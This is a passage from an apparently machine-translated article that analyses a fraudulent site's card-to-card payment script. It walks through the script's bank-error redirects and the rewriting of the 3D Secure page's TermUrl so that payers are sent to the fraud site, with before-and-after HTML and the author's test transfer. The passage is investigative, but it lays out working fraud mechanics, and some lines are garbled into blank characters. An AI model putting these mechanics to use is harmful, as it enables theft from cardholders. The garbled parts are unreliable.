class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Invalid amount"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in amount field"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Wrong original amount"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectAmount"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Re-enter transaction"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/Retry"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Expired card"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ExpiredCard"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Not sufficient funds"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/InsufficientBalance"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds amount limit"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/AmountOverlimit"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds frequency limit"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/QuantityOverlimit"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card number field"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectNumber"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card expiration date field"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectExpiresDate"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in currency field"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectCurrency"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"AS_FAIL"</span></span></span><span class="javascript">){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectPassword"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; (ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"NS_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"S_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"UNAVAIL"</span></span></span><span class="javascript">)){ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/3DSFailure"</span></span></span><span class="javascript">; } </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> { </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/TechReasons"</span></span></span><span class="javascript">; } } </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"netcetera_set_DID('');redirect('Authentication failed','BIN_ERROR')"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br></div></div><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">An example of debug information if the bank reports an error when paying</font></font></b> <div class="spoiler_text"><img src="https://habrastorage.org/files/73f/c74/88a/73fc7488aa40469da8984c474be4ae1b.png"><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Line 174 - If a script did not exit the script due to a payment error, it means that everything is proceeding as planned. In the page that was previously saved in the $ page variable, all the substrings with the address are replaced with a </font></font><code>https://3ds.payment.ru/cgi-bin/cgi_link</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">line with the address of the mydomain.ru/sus.php?cd=... type is the address of the page on the fraudulent website that the user must go to if the payment is successful. (On this user page, you can thank and inform him that e-tickets have been sent to the post office). After replacing the substring, the result is stored in the $ pp variable.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Line 175 - The $ pp variable is displayed in the browser. Since the $ pp variable is a string with the full HTML code of the page, the user will see a page. From the original page, which the bank gave away, the displayed page will not differ externally - the only difference will be inside the HTML code in the place where the link was replaced. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">So what is this page that the bank gives if you enter the correct card number, and in which the script substitutes a link to the successful payment page on the fraudulent website? And after all, there probably should be a 3D Secure check from the sending banks that will not allow payment? The code ended on the most interesting place and there are doubts that it can work without additional tricky scripts, forms, etc.</font></font><br><br> <b>     .          - .     .       .</b> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In the aviacfg.php file I drive in my bank card number. On it you will try to accept the translation, if, of course, it turns out. I open the page with the form previously saved on the disk. This form was simply saved in the browser when visiting one of the fraudulent sites, which at the time of writing the first part of the publication, was still working. The form has been preserved with a sum of 2915 rubles, and this is too much for testing. Let's change this. In any form there are visible and hidden fields. Hidden fields (input, select) are no different from ordinary ones, except for the fact that they are not visible. Such fields are used to store service information that the user does not need to see. The input fields are hidden in two ways.</font></font><br><br><ul><li>   CSS ( display:none).    ,     (input),    , ( DIV)     input. </li><li>      ‚Äî   ,  type=¬´hidden¬ª.      type=¬´text¬ª. </li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In our case, the form fields are hidden using type = "hidden". </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Click in the browser F12 (web development mode). Find the right place in the HTML code and change the text type = "hidden" to type = "text" for two or more input elements. Now we see the fields that store the amount and the service code (code). Reduce the amount from 2915rub to 20rub. Now we enter the data of our second bank card into the form. Money from this card must be deducted in case you manage to make a transfer. </font></font><br><br><img src="https://habrastorage.org/files/ad2/9e5/fa2/ad29e5fa23e54550a59d9b54dd808ada.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We confirm the form by clicking on the button "Pay". After pressing the button, the payp2p.php script is launched, which receives the data entered into the form.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">To my surprise, after entering the real card number and clicking on the ‚ÄúPay‚Äù button on the test form, I saw the Sberbank page (the bank from which the transfer is being made) on the screen, asking me to enter the 3D Secure confirmation code. </font></font><br><br><img src="https://habrastorage.org/files/587/7a4/aa3/5877a4aa3a514b3bb171c8ba1e264f07.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I also received an SMS from Sberbank with a code on my phone.</font></font><br><br><img src="https://habrastorage.org/files/c3b/628/abc/c3b628abc43a446bb15606dec3b9f083.jpg"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Before testing with a valid bank card, I assumed that in order to confirm the 3D Secure code, it would need to be ‚Äúlured‚Äù from the user in some way, and then programmed to be hidden in the present confirmation form, 3D Secure. However, everything turned out to be much simpler. After the data for transfer from card to card is sent to Promsvyazbank's website, the form of the card issuer of the card from which the transfer is made is displayed in the browser. In my case, this is Sberbank. This form is not even necessary to forge. The confirmation form is displayed on the Sberbank's HTTPS website. Victims of fraudsters themselves directly in this familiar form enter a confirmation code. After that, if the transfer passes, the money is written off. Although it is theoretically possible to protest such a transfer, it is far from a fact that the money will be returned.The likelihood of a refund is influenced by many factors, including how quickly the ‚Äúvictim‚Äù applies to his bank.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The HTML code of the page that Sberbank gives to confirm 3D Secure under the spoiler. </font><font style="vertical-align: inherit;">The code was obtained during testing by writing the $ page variable to a text file. </font><font style="vertical-align: inherit;">Line 166 of the payp2p.php script.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTML code of 3D Secure page before string replacement</font></font></b> <div class="spoiler_text"><pre> <code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) </span></span></span><span class="javascript">{ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit(); } </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The HTML code of the page after it replaces part of the text, under the spoiler. </font><font style="vertical-align: inherit;">The code was obtained during testing by writing the $ pp variable to a text file. </font><font style="vertical-align: inherit;">Line 174 of the payp2p.php script.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTML code of the 3D Secure page after replacing the line</font></font></b> <div class="spoiler_text"><pre> <code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) </span></span></span><span class="javascript">{ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit(); } </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> In short, in the HTML code of the 3D Secure page (in this example from Sberbank) the line: </font></font><br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Programmatically changed to: </font></font><br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span 